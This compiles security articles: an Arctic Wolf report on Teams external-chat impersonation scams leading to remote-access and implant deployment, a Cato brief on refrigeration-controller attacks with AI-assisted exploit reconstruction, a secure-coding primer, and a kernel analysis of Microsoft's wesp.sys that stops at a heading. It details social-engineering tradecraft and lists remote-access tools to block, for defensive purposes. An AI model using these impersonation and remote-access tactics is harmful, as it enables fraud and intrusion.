Title: Beyond the Inbox: How Threat Actors Abuse Microsoft Teams External Chat for Initial Access
Context: This activity does not exploit any known Teams vulnerability; it abuses a legitimate, default-on collaboration capability
Full Text:
Summary

Arctic Wolf Labs has observed a recurring social engineering pattern in hundreds of cases where threat actors have used Microsoft Teams’ external chat creation feature for impersonation scams, or to deliver malicious files. A consistent pattern of attacker behavior has emerged across these incidents: the use of the same throwaway tenants, the same “IT Support (Internal)” display names, the same remote-access tools, and increasingly, the same payload domains.

In this report, we’ll explore our findings, examine how attackers weaponize the external access / federation feature in Teams to reach employees, reveal the infrastructure identified through Arctic Wolf’s telemetry, and discuss the defensive measures organizations can take to disrupt this attack chain.

Key Findings

Arctic Wolf analyzed more than 400 incidents involving abuse of the Microsoft Teams external chat functionality for social engineering activity and initial access.

Threat actors repeatedly used highly consistent IT-support impersonation tactics, including IT-themed display names, friendly-sounding first names, and “(Internal)” labels designed to undermine external-user warnings in Teams.

We observed a measured infrastructure shift, from disposable .onmicrosoft[.]com tenants toward attacker-controlled domains, with .top domains accounting for roughly half of observed paid-domain cases.

Arctic Wolf detects this activity at the ChatCreated stage, creating a window of opportunity to identify and disrupt attacks before a victim engages with the threat actor.

Context

Microsoft Teams ships with external access (federation) turned on by default, meaning any Teams user in another Microsoft 365 tenant can find, chat with, and call an organization’s employees, provided both tenants allow external access. This is the feature attackers most frequently abuse. This activity does not exploit any known Teams vulnerability; it abuses a legitimate, default-on collaboration capability.

How Threat Actors Establish Teams Identities

Threat actors commonly establish external Teams identities through newly created or acquired Microsoft 365 tenants. Between 30 to 40 percent of the cases we analyzed involved default *.onmicrosoft[.]com tenant domains. This default domain requires no verification and can be provisioned within minutes, giving attackers a functioning Teams identity with minimal setup.

Arctic Wolf observed that, even when using this default domain, attackers engineer the tenant’s sender name to read as IT infrastructure. We have supplied a list of the default *.onmicrosoft[.]com tenant names observed in use across multiple customers in the Appendix at the end of this report [1].

Arctic Wolf assesses that threat actors typically select a support-, IT-, admin-, network-, or helpdesk-themed word as the tenant name, optionally suffixed with the number 365, or the words online, portal, or a random number, to obtain a free tenant name. In a smaller number of cases, Arctic Wolf observed threat actors using legitimate company names in the sender’s tenant name to increase their credibility.

How the Attack Unfolds

In a significant number of cases, customers reported that the malicious Teams contact was preceded or accompanied by “mail bombing”, the flooding of a victim’s inbox with hundreds of newsletter or subscription confirmations within minutes. The email storm is intended to manufacture urgency and bury legitimate emails such as security alerts, with the Teams “IT support” message arriving moments later to offer to resolve the very same problem the attacker just created.

This reflects an abuse of trust: employees are generally trained to treat email with suspicion, but a message delivered from inside their Teams instance bypasses that learned caution.

Beyond email masquerading, Arctic Wolf identified a range of consistent naming techniques used by threat actors across customer alerts. The attacker’s Teams display name is central to the deception. Arctic Wolf observed the following impersonation display names most frequently, meaning the pattern occurs across multiple cases: [2]

Attackers append “(Internal)” to the display name so the recipient perceives the message as coming from an internal IT sender, even though Teams simultaneously labels the sender as External.

Reoccurring usage of friendly-sounding names, such as “IT Service Desk – Liam , IT Support (Scott McGhee)”, or “IT Service Desk (Matthew)”. Here, adding a first name makes the Teams message appear to come from a real member of their organization’s Service Desk.

In several cases, attackers used region-specific naming conventions tailored to the target’s locale: for example, “Supporte TI,” the French/Spanish variant of “IT Support.”

We observed roughly 100+ emoji markers ( 🛡 shield, 🛠️/🔧 tools, ✅ check) used in attacker display names: e.g., “IT Support 🛡| Corporate IT Service 🛠 (Internal).” This may be evidence of the use of AI such as ChatGPT and AI-related automation to create content and identities in support of this campaign.

Most recently, we observed the attacker/external Teams user adding the target organization’s domain or company name in their own display name to make the message appear more legitimate.

We also observed a recent shift toward paid top-level domains (TLDs) for tenant creation. Of the paid domains we identified in these types of scams over the past few months, approximately 50 percent of fake identities used the .top TLD, around 40 percent used a standard .com domain, and just over five percent used multi-level domains such as .com.pl, .com.vn, and .com.br.

This aligns with Sophos’s reporting on the STAC4749 / Chaos ransomware campaign, which found that attackers have moved away from onmicrosoft[.]com throwaway tenants and toward IT-themed .top domains for payload staging and command-and-control (C2), as the low cost of .top registrations allows for convincing “update/ security/support” hostnames. Arctic Wolf also observed repeated use of other common TLDs, including .com.br and .com.vn in activity reported during July and August.

In a subset of these custom domains, attackers deliberately configured DNS records to redirect web requests to the legitimate Microsoft or victim organization site to appear authentic.

Attack Chain for Teams Chat Creation

Attackers target organizations where external access is enabled. Chat creation itself is only the entry point. Arctic Wolf assesses that, once trust is established, the attacker’s immediate goal in most cases is to obtain hands-on-keyboard access through a legitimate remote monitoring and management (RMM) tool.

We also frequently observed attackers using vishing (a direct voice call to the victim from within Teams) to secure RMM installation. In cases where attackers target multiple victims simultaneously, typically via automation, the initial contact begins with a Teams chat message instead of a call. The most commonly observed RMM tools used in relation to this scam were Quick Assist (QuickAssist.exe / msra.exe), AnyDesk, ScreenConnect (ConnectWise), TeamViewer, Atera, Zoho Assist, NetSupport, and LogMeIn.

Of these, Quick Assist is the most frequently used. This may be because it is built into Windows, signed by Microsoft, requires no installation, and only requires the victim to read back a six-digit code. When attackers seek persistence beyond the initial call, they pivot to a commercial RMM tool (AnyDesk, Atera, ScreenConnect, or a second platform such as Level, installed via msiexec), which provides an independent control channel that survives remediation of the original implant.

Arctic Wolf identified a consistent attack chain across successful exploitation cases and correlated it with chains previously documented by security vendors such as Microsoft and Zscaler:

Attackers commonly target multiple users within short windows of time (approximately five minutes) to increase the likelihood of success, most likely performed through automation. Once a victim engages, the attack chain reported by customers shows threat actors reaching payload execution in under 15 minutes. Arctic Wolf observed similar compression in its own data: several cases recorded concurrent credential-access detections (Kerberoasting, GoldenPAC-related) firing alongside the initial Teams alert, indicating the endpoint was already compromised by the time the chat alert was triaged.

In a subset of cases, attackers leveraged Microsoft’s notes. Attackers generally avoid pasting a URL directly into Teams, which would trigger Safe Links / ZAP scanning, and instead navigate to the payload themselves during the remote session. Consequently, endpoint and identity telemetry are essential monitoring surfaces alongside message scanning.

How Teams Chat Abuse Works

Threat actors using external Teams chat as an initial-access vector is not new. The practice was first documented by Microsoft in the Black Basta (Storm-1811) campaign in mid-2024, which used the now-familiar chain of email bombing → external Teams “help desk” → Quick Assist → QakBot/DarkGate/Cobalt Strike → ransomware.

The technique was later observed in the Cactus campaign and in 3AM and Chaos. Earlier this year, Zscaler reported on the GoGRPC campaign, in which Teams vishing and Quick Assist were used to deploy the GoGRPC backdoor.

Example Attack Observed by Arctic Wolf

Arctic Wolf recently identified a potentially novel infection chain leveraging external Microsoft Teams chat messages, in which the threat actor posed as an IT helpdesk employee to initiate the attack. In the case we observed, the attacker instructed the user to run a PowerShell command and launch the downloaded file. The initial payload retrieval was performed via PowerShell, and both actions executed under the victim’s account with a parent process of explorer.exe, reminiscent of ClickFix, though not disguised as a CAPTCHA.

Next, the PowerShell command downloads an MSI from Azure Blob Storage, which bundles a PowerShell script and a ZIP archive (archive6.zip). Approximately 30 seconds after the MSI is launched by the user, the bundled PowerShell script (cleaner.ps1) is dropped into the users’ AppData folder (AppData\Local\PowershellCleaner\scripts) and executed. The script cleaner.ps1 contains a large array of hexadecimal characters, preceded by an IEX instruction to execute the joined and decoded array; the resulting plain code is a loader that reads a block of AES-encrypted data, decrypts it using hard-coded key/IV and computes its hash. If the hash matches a hard-coded value, the resulting PowerShell is executed via ScriptBlock.

Ultimately, this is an obfuscated decryption and execution stub to build and run an additional PowerShell payload. The purpose of this final payload is to extract the pythonw interpreter and implant (ss.py), both from the bundled archive6.zip. After sleeping for five seconds, the implant is executed via pythonw.exe.

The implant then starts another MSI transaction that issues LDAP queries to Active Directory for all computer and user objects (filtering for both Category and Class) using the System.DirectoryServices.DirectorySearcher PowerShell shortcut adsisearcher, formatting the attribute output as [sAMAccountName] – [description]. This information is then transmitted to C2 server endpoints that are randomly selected from a list of domains and URIs laid out in the implant’s code.

How Arctic Wolf Protects its Customers

From the newly created tenant, the attacker initiates a one-on-one chat, which avoids the visibility associated with group conversations. Microsoft records this first contact as a ChatCreated event, which Arctic Wolf assesses to be the primary detection opportunity for defenders. Our alerts most frequently fire exactly here, before the user has done anything.

Arctic Wolf combines multiple detection engines to identify suspicious external Teams chats. Drawing on observations from thousands of customer environments, Arctic Wolf maintains indicators of compromise (IOCs) associated with these campaigns, including impersonation-focused display names such as IT Helpdesk and Helpdesk Support as well as attacker-controlled tenant and domain patterns.

Arctic Wolf’s behavioral engine also monitors Microsoft tenants that initiate conversations with multiple Arctic Wolf customers. When activity from a tenant, account, or domain appears anomalous, particularly when combined with other signals such as email bombing or suspicious follow-on activity, Arctic Wolf flags it for investigation.

Arctic Wolf also tracks top-level domains that threat actors commonly use to create tenants, host payloads, or support command-and-control infrastructure.

Beyond monitoring the initial Teams-based social engineering lure, Arctic Wolf maintains detections for the remote monitoring and management (RMM) tools that attackers frequently push during these engagements. Arctic Wolf alerts on the execution of RMM tools that are not sanctioned or expected within a given environment, since the unauthorized installation of legitimate remote access software is a common technique used to establish persistence once a victim has been convinced to grant access.

Arctic Wolf also correlates behavior over time, flagging cases where an RMM tool installation is followed by reconnaissance commands, such as enumerating users, groups, or network configuration, and prioritizing these for investigation.

Conclusion

External Microsoft Teams chat has become an effective initial-access vector because it exploits trust rather than a software vulnerability.

Arctic Wolf has been able to monitor and protect our customers from these attacks with proactive defenses. Across the activity examined, attackers combined email bombing, convincing IT-support impersonation, newly created tenants and domains, and rapid social engineering to move victims from a seemingly routine chat to remote access, payload execution, and, in some cases, broader compromise.

The recurring patterns provide defenders with valuable opportunities to interrupt the attack chain. An unexpected chat from an external tenant, particularly one that follows an inbox flood or uses an IT-themed display name, should be treated as suspicious. Correlating ChatCreated events with endpoint, identity, email, domain, and remote-access telemetry can reveal the progression even when the initial interaction appears benign.

Defensive Countermeasures for Organizations

Most organizations have no legitimate need for open, any-tenant external chat. Per Microsoft’s guidance in Manage external meetings and chat with people and organizations using Microsoft identities, move from “allow all” to an allow-list of trusted organizations. Organizations can take the following proactive steps:

In Teams admin center → Users → External access, select “Allow only specific external domains” and add only the partner domains the organization actively collaborates with. Once an allow-list is configured, all other domains are blocked by default.

Block chat with unmanaged / Teams-consumer accounts, and disable the option that lets unmanaged users start conversations with your users.

Block federation with trial-only tenants, as attackers commonly prefer free or trial tenants for their minimal setup requirements:

Set-CsTenantFederationConfiguration -ExternalAccessWithTrialTenants "Blocked"

Enable “Allow my security team to manage blocked domains” so the security team can push blocks (e.g., the .top indicators listed in this report) through the Microsoft Defender Tenant Allow/Block List → Teams domains tab.

Harden the remote-access path: block or restrict Quick Assist to authorized IT roles (or remove it where unused), and block or uninstall unsanctioned RMM tools (AnyDesk, TeamViewer, ScreenConnect, Atera, Level, Splashtop) via Defender for Endpoint or application control. Alert on any RMM tool not deployed through the Arctic Wolf agent.

Because this attack vector relies on social engineering rather than technical exploitation, people and process controls are critical to closing the gap:

Out-of-band verification for all remote-access requests. Mandate a callback to the user’s registered number or an approval flow in a separate trusted app. An impersonator controlling the Teams channel can’t complete a verification that lives outside it.

Tell staff exactly how real IT reaches out (which channels, which domains, which named contacts), and that unsolicited external “IT support” is inherently suspicious (especially if it appears right after an inbox spam flood).

Train users to read the External tag and the real sender domain, and to never dismiss the Accept/Block, Safe Links, or first-contact warnings. Provide side-by-side examples of the organization’s real help desk communications versus an impersonator’s.

Conduct targeted training for personnel regarding the specific social engineering tactics used in this campaign. For those without the time to devote to creating security training resources from scratch, the Arctic Wolf Aurora® Managed Security Awareness and Training solution delivers easily digestible security lessons for employees, including regular phishing simulations and a “Report Phish” button.

Microsoft is also clearly taking this threat seriously too. They’ve now built end-user reporting for security directly into Teams, letting employees report a suspicious message or an external user with a couple of clicks.

Title: Cato CTRL Threat Brief on Attacks Against Refrigeration Controllers
Context: Our agentic vulnerability researcher helped reconstruct exploits for Danfoss vulnerabilities by analyzing vendor patch files, without publicly available proof-of-concept exploits
Full Text:
Executive summary

CERT-FR’s October 13 update reports compromises of refrigeration controllers, naming Danfoss AK-SM and AK-SC alongside Copeland/Dixell XWEB systems. The entry methods remain unconfirmed. CERT-FR warns that attacks are probably continuing and recommends removing public exposure, checking configurations, and securing remote access. Compromised operational technology (OT) can disrupt cooling, compromise stored products, and threaten cold-chain continuity.

Our agentic vulnerability researcher helped reconstruct exploits for Danfoss vulnerabilities by analyzing vendor patch files, without publicly available proof-of-concept exploits. This work supported deployment of IPS signatures within 24 hours of the initial incident reports as part of our virtual patching coverage. We continue to monitor public proof-of-concept releases, exploitation reports, and investigation findings across refrigeration vendors to assess the need for additional signatures.

Operational and business impact

Operational disruption. Unauthorized changes to setpoints, defrost schedules, or alarms can disrupt cooling across multiple units, spoil products, and delay detection.

Business and supply-chain impact. Inventory losses, interrupted sales, equipment damage, and emergency maintenance can cause financial and reputational harm. At scale, disruption could affect food availability and national resilience.

Security exposures to assess

Internet-exposed management interfaces. Publicly reachable controllers face greater risk of unauthorized access where authentication and access restrictions are inadequate.

Remote access without least privilege. Shared accounts, weak authentication, and excessive permissions increase the risk of unauthorized changes. Access across sites and weak segmentation can widen the impact.

Vulnerable or unsupported systems. Published research into Danfoss AK-SM 800A and Copeland XWEB Pro controllers documented multiple vulnerabilities. Their exploitation in the reported attacks has not been confirmed.

Overlooked cellular connections. Supplied SIMs and vendor-managed 4G/5G routers may bypass network controls and escape inventories, monitoring, and risk assessments. Private APNs also need verified isolation between subscriber devices.

How Agentic AI Can Accelerate OT Attacks

Agentic AI could accelerate reconnaissance, analysis of disclosed vulnerabilities, and repeated exploitation attempts against reachable controllers. This may reduce the time and expertise needed to turn an exposed interface into operational disruption. At the time of writing, we have not identified public evidence of AI involvement in the refrigeration incidents.

Protection and recommendations

General recommendations

The following are general recommendations for reducing risk across connected refrigeration environments.

Reduce internet exposure. Remove unnecessary public access. Authenticate and authorize remote users before granting equipment access through a secure VPN or protected network, following CERT-FR guidance.

Secure maintenance access. Change default passwords. Use unique credentials, named accounts, MFA where supported, and least privilege, separating monitoring from configuration access where possible.

Maintain supported systems. Track firmware and support status, apply vendor updates, and replace unsupported equipment. Follow Danfoss security guidance and guidance for other deployed platforms.

Segment operational equipment. Allow only required traffic between refrigeration equipment, corporate IT, maintenance networks, and sites.

Monitor operating conditions. Alert on unexpected changes to temperatures, defrost schedules, alarms, and accounts. Consider independent temperature monitoring and verify safe operation after incidents.

Assess cellular access. Inventory SIMs and vendor-managed cellular links. Include them in risk assessments, verify access controls and logging, and validate private APN isolation and routing.

Cato protection

Our SASE platform supports authenticated remote access, least-privilege access policies, and network segmentation. SASE allows these controls and traffic inspection to be managed centrally across sites and remote maintenance connections routed through the platform. In a previous blog post, we discussed OT security recommendations and showed how the platform supports secure remote access, segmentation, and monitoring of device communications.

In another previous blog post, we discussed how Cato Autonomous Policies for FWaaS analyzes policy rules and their context to help identify misconfigurations and overly permissive access.

Our Researcher Agent helped us create a proof of concept for Danfoss controller vulnerabilities, supporting our mitigation work. This agent-assisted workflow helps accelerate vulnerability analysis and protection development while retaining researcher review.

IPS virtual patching provides network-based protection against applicable vulnerability exploitation. Coverage depends on the vulnerability, enabled controls, and traffic reaching the relevant inspection point.

In another blog post, we discussed how our Agentic Threat Prevention correlates suspicious host activity and applies inline controls to help interrupt attack progression, including lateral movement. This is relevant where a compromised system could provide a route toward operational equipment or other connected assets.

We have added IPS signatures for applicable, publicly disclosed Danfoss vulnerabilities as part of our virtual patching coverage. We continue to monitor public proof-of-concept releases, exploitation reports, and investigation findings involving Danfoss and other refrigeration vendors. As new information becomes available, we will assess the need for additional IPS signatures and updates to our virtual patching coverage.

Code security for new coders
Context: There are also many security tools available, but it can be confusing to know what type of tool to use and when
Full Text:
Coding agents enable anyone to turn their ideas into reality. However, building with security in mind is imperative to keep your application secure. There’s a lot of reference information about application security out there, but it often is jargon-heavy and targets developers or security professionals, not vibe coders. There are also many security tools available, but it can be confusing to know what type of tool to use and when. This post breaks down essential security terms and tools so that you can build safely from the start.

If you aren’t sold on the importance of application security or think it only matters to large companies, consider the PHP2Shell vulnerabilities disclosed in October 2026. These two vulnerabilities affect PHP, a programming language used by more than 70% of websites. They could allow an attacker to take control of a website’s server. The vulnerabilities are so serious that some organizations temporarily took services offline while installing security updates.

What is code security?

In simple terms, code security is the practice of writing secure code. Because application security starts with code security, taking a proactive approach early prevents major vulnerabilities later.

There are two main things we need to be concerned with when thinking about code security: the code you (or your agent) is writing (i.e., first-party code), and the code that is written by someone else but being used by your application (i.e., third-party code). With first party code, you are directly responsible for fixing the problem. Third-party code is treated differently because you are not the one who can fix the code, but you are responsible for using a version that does not have vulnerabilities. We often refer to third-party code as being part of the software supply chain, but more on that later.

What is first-party code?

First-party code is the code that you are producing and are thus responsible for. While being responsible for maintaining secure code might seem intimidating, you can most likely fix security issues by prompting the agent to fix them. There are automated security scans you can run to discover vulnerabilities, or you can simply ask the agent to do a security check. Checking for OWASP top ten vulnerabilities is always a good place to start.

What are secrets?

One of the simplest, yet most impactful ways to improve security is to avoid hardcoding secrets. This means that you should never write in the code any password, token, key, or any secret or credential that can be used to gain access to your resources. Instead, you can use environment variables that act as a placeholder that point to a specific hidden configuration file or a secret manager.

What is the software supply chain?

The software supply chain refers to everything that is used to develop and run an application, including dependencies, tools, and infrastructure. There are also open source code components used in the software supply chain, such as GitHub actions and Docker images, which can help you deploy and run your code. Of all these elements, third-party dependencies are usually the main focus in discussions about code security.

Now you might be thinking, why do I need to use third-party code? Technically you don’t, but it makes writing code much easier, whether it’s done by you or an agent. By relying on these open-source dependencies, you are using code that was already written by someone else and that is shared with the community to solve a problem. What’s important to understand in the context of AI-generated code is that coding agents use dependencies by default, often relying heavily on outdated versions.

Dependencies rely on other dependencies, so the risk starts to grow as you start to use them. There are two things in particular you need to be concerned about with third-party dependencies: vulnerabilities and malicious packages. Vulnerabilities in third-party dependencies are accidental code issues that usually require upgrading to the latest version once the issue is fixed. Malicious packages represent a more intentional threat and are becoming more common. With these packages, someone has purposefully added a malicious script in the version and released it for personal gain.

Overall, the concern with using third-party code is that dependencies can quickly accumulate vulnerabilities if the maintainer doesn’t have the time to address these security flaws.

Security questions to ask your coding agent

The cool thing about vibe coding is that you can ask the agent any questions you may have. The difficulty can be knowing exactly what to ask. Below is a list of good places to start, but it is not exhaustive.

Setup questions

These are the types of questions that should be asked before any code is written. The goal is to have some security requirements planned out so an agent has a path to follow.

What sensitive data will this app handle (passwords, payment info, personal data, API keys), and how should each type be protected?

What authentication and authorization approach fits this app, and what are the tradeoffs?

Follow-up questions

After the code is written, you should make sure the agent made the best decisions for security. Ask questions that make the agent explain why certain security decisions were made. This will force the agent to go back through the code, which might lead it to suggest a change.

Can you do a security review on the application? Are there any concerns?

Do any OWASP top 10 vulnerabilities exist in this code?

What security tradeoffs did you make to keep this simple, and what would you fix before real users touch this?

If you were a penetration tester, what's the first thing you'd try to break in this app?

What third-party packages did you use? Are any of them outdated? Do any have known vulnerabilities?

Does any of this code contain hardcoded API keys, passwords, or tokens? If so, where, and how do I move them to environment variables or to a secrets manager?

Are default credentials or debug modes left enabled anywhere?

Is there a .env or config file here, and is it excluded from version control (.gitignore)?

Are there any insecure coding patterns or logic flaws present?

Is there anything concerning about the current authentication and access controls configuration?

Are cloud storage buckets, databases, or admin panels publicly accessible when they shouldn't be?

If this is deployed, what's exposed to the internet that doesn't need to be?

What are the different types of code security tools?

Security tools come in all shapes and sizes. While many tools are paid, there are also open source tools that function similarly. The list below includes the most common types of tools.

Software Composition Analysis (SCA)

Tools of this type scan all the open-source dependencies that are being used in the application and alert you if there are any vulnerabilities. Most providers will also tell you what version you can upgrade to in order to eliminate that vulnerability.

Static Application Security Testing (SAST)

This type of tool is focused on looking at your first-party code for vulnerabilities. Most commonly, these tools scan the written code without running that code. They are good for early detection while you are actively coding but can provide more false positives than other tools do.

Interactive Application Security Testing (IAST)

Tools in this category look at how data is flowing into a running application to find code vulnerabilities. Since they require a running application, they are generally used later in the software delivery life cycle compared to SAST tools. However, they also tend to be more accurate.

Dynamic Application Security Testing (DAST)

Tools that perform this type of security scan run pre-configured automated tests against a running application. They are not interchangeable with SAST or IAST tools.

Infrastructure as Code (IaC) Scanning

Tools that use this type of scanning are focused on looking at any IaC files for risky settings and misconfigurations.

Secret Scanning

Secret scanners search your codebase for hardcoded credentials, API keys, and passwords.

How Datadog can help

Security scans are a great way to understand what is happening in your code. Datadog Code Security has many types of tools you can use to gain visibility into your application, including SCA, SAST, IAST, IaC, and Secret scanning tools.

Datadog also has two open source tools that can be used for supply chain security: GuardDog to flag malicious packages and Supply Chain Firewall to block malicious packages from being installed.

Conclusion

The good news is that you do not need to become a security expert before bringing an idea to life. Start with a few basics: keep secrets out of your code, scan both first-party and third-party code, update your dependencies, and ask your coding agent to check for common vulnerabilities.

The goal is not to build a perfectly secure application on your first try. It is to understand what your application uses, recognize the risks, and make security part of how you build from the start. Addressing issues along the way is much easier than responding after your application or its users have been put at risk.

Title: Kernel eviction notice: What wesp.sys reveals about the Windows Endpoint Security Platform
Context: Any features or functionality not currently available may not be delivered on time or at all
Full Text:
Microsoft is building a way for EDR products to run outside the Windows kernel. It is called the Windows Endpoint Security Platform, and two of its binaries already ship in Windows Insider build. One is the kernel driver wesp.sys, the other the user-mode API espclient.dll. Microsoft wants one kernel driver it maintains itself, in place of the one every security vendor currently ships, after the July 2024 CrowdStrike update crashed 8.5 million machines. WESP is undocumented, but the binaries carry public symbols, so a kernel debugging session gets you a fair way in. wesp.sys is a file system mini-filter at altitude 329500, talking to user mode over a filter communication port.

Kernel mode vs user mode: How EDR works today

Are you tired of the Windows Blue Screen of Death? Well, Microsoft decided to take significant action to remove security products from running within the Windows kernel, as kernel components are the ones that can cause Windows to Blue Screen, which can have a significant impact, as was demonstrated a couple of years ago with a bug in a third-party kernel component.

Typical Endpoint Detection and Response (EDR) software consists of two main components: a kernel-mode driver and a user-mode service, communicating in some way, as the following image shows:

The process boxes represent normal user applications running on a system, like Word, Explorer, or Paint. The Service and Kernel Driver are installed by the EDR product.

The kernel driver’s main purpose is to register for various kernel notifications, such as process creation and file writes. Any notification of interest is typically forwarded to the user-mode service where more processing can be done:

Forward the notification data to a server for further analysis and aggregation.

Consult a set of rules that may lead to blocking the operation entirely.

Alert the human user of the operation, perhaps requiring an interactive decision.

This is all well and good, if everything works as planned. Unfortunately, kernel drivers cannot perform illegal operations, such as dereferencing a bad pointer. In that case, the system crashes with the infamous “Blue Screen of Death” (BSOD), and restarting the machine is the only way back in, assuming the offending driver doesn't crash when it loads early at boot.

Why the CrowdStrike outage changed Microsoft’s mind

That is exactly what happened on July 19, 2024, when a bad configuration file update caused CrowdStrike’s EDR kernel driver to crash on millions of machines worldwide. The risk of kernel drivers crashing systems has existed in Windows since its inception, but this incident was particularly nasty because it rendered so many machines unusable, taking airports, banks, and other critical facilities offline for hours.

Microsoft took this to heart; after all, it's Windows. They launched a new initiative to move EDR products out of the kernel so similar incidents can’t happen. This is non-trivial, however, for a few reasons:

The Windows kernel will now have to deliver notifications that EDR kernel drivers expect to the EDR’s user-mode service. This has to be efficient to be usable.

Existing products will take time to migrate, even if Microsoft provides a full solution, so we must support the existing behavior.

Any such framework must be flexible enough, and complete enough, to be adopted successfully. If features EDR products require are missing, adoption and migration will be partial at best.

What is the Windows Endpoint Security Platform (WESP)?

The Windows Endpoint Security Platform is Microsoft’s framework for moving EDR products to user space. The project is in its early stages, as shown in Windows Insider builds that include the new platform’s binaries. The main component is a kernel driver, wesp.sys, built by Microsoft, and a user-mode API implemented in espclient.dll that EDR’s user-mode service would use to connect and receive notifications of interest.

It may seem ironic that the implementation centers on a kernel driver (wesp.sys), but there is no way around it; at the end of the day, the kernel must provide the notifications the EDR service expects. So, wesp.sys will play the role of an EDR kernel driver, but since Microsoft implements it, there will be only one driver to test and debug properly, rather than the current state where every EDR platform has its own in-house kernel driver.

What EDR vendors need from WESP

At the time of writing, the WESP platform is not publicly documented. There are some expectations, however, that the platform must provide if EDR systems are to adopt it:

It should be comprehensive. EDRs today register for notifications in several different ways, each with its own mechanism:

Event type

Current registration mechanism

Process, thread, image, handle

Registration functions with a callback

Registry

Registration functions with a callback

File system

File system mini-filter

Network

WFP callout driver

All these variations add to the complexity of EDR drivers. WESP should provide all of these; otherwise, EDR drivers will continue to exist, albeit with less code for what WESP covers. It’s reasonable to assume that not everything will be provided on day one, but I expect everything to be provided eventually.

Some notifications a kernel driver can register for are very “noisy”. For example, Registry and file read operations are happening all the time in large quantities. You can get a sense of that by running Process Monitor (ProcMon) from Sysinternals and watching the hundreds of events (or more) displayed every second related to the Registry and the file system (especially read operations). Passing all such events to user mode is not feasible; it would be too slow, or at least inefficient. This means WESP will have to provide some filtering capability, so that events that are not interesting can be dropped “at the source” (the WESP driver), rather than being sent to user mode and dropped there. Flexibility in these rules is paramount, as it can significantly lower the load on the user-mode service.

A power that only certain kernel notifications have is blocking an operation, something that cannot be done in user mode. The classic example is creating a process – a kernel driver can register for such events with PsSetCreateProcessNotifyRoutineEx – a documented function all EDRs use. The callback is invoked while process creation is in progress, allowing it to set a failure status for the process creation if it so desires (for example, by inspecting the new process command line and deciding it’s malicious). Such power does not exist in user mode – you can get notified when a process is created, but you cannot veto creation. WESP clients (user mode) must be given this power so they can block process creation under certain conditions. These conditions should be flexible enough to be configured in most cases. Ideally, it should let the user-mode service run custom code before replying to the driver with whether to allow or block process creation.

Client processes that work with ESP must run elevated to access the platform. They will likely need to run as Protected Processes Light (PPL), signed by Microsoft, which is how EDR services run today, at least with most vendors, since it’s not currently required.

Inside wesp.sys: What the binaries reveal

Though not documented yet, we can get some WESP details by examining the binaries provided. As a nice bonus, the symbols for these binaries are provided by the Microsoft public symbol server.

Running a local kernel debugging session on a VM with WESP installed can give us some insights into how WESP works. First, the WESP driver file is wesp.sys located in the System32\Drivers directory, where most drivers live. We can examine the Registry where drivers are installed to find the key name, which is also the driver kernel object name:

Clearly, the driver’s name is simply wesp. With that detail in hand, we can look in WinDbg for the major functions supported by the driver (some formatting done for better readability):

lkd> !drvobj wesp f Driver object (ffffc0e9fe2e6310) is for: \FileSystem\wesp Driver Extension List: (id , addr) Device Object list: Flags: 0x00000012 0x00000002 DRVO_LEGACY_DRIVER 0x00000010 DRVO_INITIALIZED DriverEntry: fffff80564281000 wesp!DriverEntry DriverStartIo: 00000000 DriverUnload: 00000000 AddDevice: 00000000 Dispatch routines: [00] IRP_MJ_CREATE fffff805d07a14d0 nt!IopInvalidDeviceRequest [01] IRP_MJ_CREATE_NAMED_PIPE fffff805d07a14d0 nt!IopInvalidDeviceRequest [02] IRP_MJ_CLOSE fffff805d07a14d0 nt!IopInvalidDeviceRequest [03] IRP_MJ_READ fffff805d07a14d0 nt!IopInvalidDeviceRequest [04] IRP_MJ_WRITE fffff805d07a14d0 nt!IopInvalidDeviceRequest [05] IRP_MJ_QUERY_INFORMATION fffff805d07a14d0 nt!IopInvalidDeviceRequest [06] IRP_MJ_SET_INFORMATION fffff805d07a14d0 nt!IopInvalidDeviceRequest [07] IRP_MJ_QUERY_EA fffff805d07a14d0 nt!IopInvalidDeviceRequest [08] IRP_MJ_SET_EA fffff805d07a14d0 nt!IopInvalidDeviceRequest … [0e] IRP_MJ_DEVICE_CONTROL fffff805d07a14d0 nt!IopInvalidDeviceRequest [0f] IRP_MJ_INTERNAL_DEVICE_CONTROL fffff805d07a14d0 nt!IopInvalidDeviceRequest [10] IRP_MJ_SHUTDOWN fffff805d07a14d0 nt!IopInvalidDeviceRequest [11] IRP_MJ_LOCK_CONTROL fffff805d07a14d0 nt!IopInvalidDeviceRequest [12] IRP_MJ_CLEANUP fffff805d07a14d0 nt!IopInvalidDeviceRequest [13] IRP_MJ_CREATE_MAILSLOT fffff805d07a14d0 nt!IopInvalidDeviceRequest [14] IRP_MJ_QUERY_SECURITY fffff805d07a14d0 nt!IopInvalidDeviceRequest [15] IRP_MJ_SET_SECURITY fffff805d07a14d0 nt!IopInvalidDeviceRequest … [1b] IRP_MJ_PNP fffff805d07a14d0 nt!IopInvalidDeviceRequest Device Object stacks: Processed 0 device objects.

From the output, we can see there are no driver-provided major function code handlers (I omitted a few for brevity, but they all point to the kernel-provided handler, IopInvalidDeviceRequest); in fact, no device objects exist at all. This means talking to this driver cannot be done with a classic DeviceIoControl, where a device is opened by name with CreateFile (really a symbolic link) or NtOpenFile (actual device name); there is no device to open. We see the driver object is stored in the \FileSystem object manager directory, where file-system mini-filters are typically stored. Another clue leading to the same conclusion is the Registry showing the “Type” value as 2, which represents a file system-related driver.

We expect the WESP driver to register for the various notifications a “standard” EDR driver would. We can see that when opening wesp.sys in some PE viewer (screenshot is from one of my tools, Total PE):

It also depends on FltMgr.Sys, which is the Filter Manager driver, managing file system mini-filters, proving that wesp.sys is a file system mini-filter. Another tool you can run to reinforce this conclusion is the built-in fltmc command-line tool in an elevated command window:

Filter Name Num Instances Altitude Frame ------------------------------ ------------- ------------ ----- bindflt 1 409800 0 UCPD 5 385250.5 0 wesp 7 329500 0 WdFilter 5 328010 0 storqosflt 0 244000 0 wcifs 0 189900 0 PrjFlt 0 189800 0 CldFlt 1 180451 0 FileCrypt 0 141100 0 luafv 1 135000 0 UnionFS 0 130850 0 bfs 7 100010 0 npsvctrig 1 46000 0 Wof 3 40700 0 FileInfo 5 40500 0 WinSetupMon 1 40300 0

WESP is in the list, showing its altitude (higher altitude drivers get notifications before lower altitude drivers).

How wesp.sys talks to user mode

